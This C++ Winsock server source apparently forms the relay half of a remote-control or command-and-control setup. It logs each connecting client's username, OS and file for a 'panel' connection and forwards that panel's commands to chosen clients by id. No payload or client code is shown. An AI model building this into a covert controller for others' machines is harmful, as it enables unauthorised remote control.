#include "server.h"

string dataPC {"|---------------------------|\n"
               "| id | username | os | file |\n"
               "|---------------------------|\n"};
u_int panelId;

void Server()
{
    // Initialize WinSock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOk = WSAStartup(ver, &wsData);
    if (wsOk != 0)
    {
        cerr << "Can't Initialize winsock! Quitting" << endl;
        return;
    }

    // Create a socket
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    if (listening == INVALID_SOCKET)
    {
        cerr << "Can't create a socket! Quitting" << endl;
        return;
    }

    // Bind the ip address and port to a socket
    sockaddr_in hint
    {
        hint.sin_family = AF_INET,
        hint.sin_port = htons(13254),
        static_cast<u_char>(hint.sin_addr.S_un.S_addr = INADDR_ANY) // Could also use inet_pton ....
    };

    bind(listening, (sockaddr*)&hint, sizeof(hint));

    // Tell Winsock the socket is for listening
    listen(listening, SOMAXCONN);

    // Create the master file descriptor set and zero it
    fd_set master;
    FD_ZERO(&master);

    // Add our first socket that we're interested in interacting with; the listening socket!
    // It's important that this socket is added for our server or else we won't 'hear' incoming
    // Connections
    FD_SET(listening, &master);

    // This will be changed by the \quit command (see below, bonus not in video!)
    bool running = true;

    //
    cout << "--- Server Starting! ---\n";

    while (running)
    {
        fd_set copy = master;

        // See who's talking to us
        int socketCount = select(0, &copy, nullptr, nullptr, nullptr);

        // Loop through all the current connections / potential connect
        for (int i = 0; i < socketCount; i++)
        {
            // Makes things easy for us doing this assignment
            SOCKET sock = copy.fd_array[i];

            // Is it an inbound communication?
            if (sock == listening)
            {
                char buf[4096];
                ZeroMemory(buf, 4096);

                // Accept a new connection
                SOCKET client = accept(listening, nullptr, nullptr);

                // Add the new connection to the list of connected clients
                FD_SET(client, &master);

                // Send a welcome message to the connected client
                string connectionMessage = "-Connect";
                send(client, connectionMessage.c_str(), connectionMessage.size() + 1, 0);
            }
            else // It's an inbound message
            {

                char buf[4096];
                ZeroMemory(buf, 4096);

                // Receive message
                int bytesIn = recv(sock, buf, 4096, 0);

                if (bytesIn <= 0)
                {
                    // Drop the client
                    closesocket(sock);
                    FD_CLR(sock, &master);
                }
                // Saving panelId Socket
                else if (buf[0] == 'P')
                {
                    panelId = master.fd_count - 1;
                    cout << panelId << endl;
                }
                // Special Command Server
                // A == Adding dataPC Client.
                else if (buf[0] == 'A')
                {
                    dataPC += "| " + to_string(master.fd_count - 1) + " | "+ string(buf).substr(2, string(buf).size() - 2) + "\n";

                    cout << dataPC;
                }
                // Clients Command
                else if (buf == string("-clients"))
                {
                    send(master.fd_array[panelId], dataPC.c_str(), dataPC.size() + 1, 0);
                }
                // Command Message
                else
                {
                    // Check to see if it's a command. -KillServer kills the server
                    if (buf == string("-KillServer"))
                    {
                        cout << "Kill Server!\n";
                        running = false;
                        break;
                    }
                    // Command Send To Client
                    else
                    {
                        //
                        SOCKET outSock = master.fd_array[(int)buf[0] - 48];
                        if (outSock != listening && outSock != sock)
                        {
                            //
                            string command = buf;
                            string sendCommand;

                            // deleting 1 and 2 characters (1 -Test -> -Test)
                            sendCommand = command.substr(2, command.size() -2);

                            // Send Command
                            send(outSock, sendCommand.c_str(), sendCommand.size() + 1, 0);
                        }
                    }
                }
            }
        }
    }

    // Remove the listening socket from the master file descriptor set and close it
    // to prevent anyone else trying to connect.
    FD_CLR(listening, &master);
    closesocket(listening);

    // Cleanup winsock
    WSACleanup();

    system("pause");
}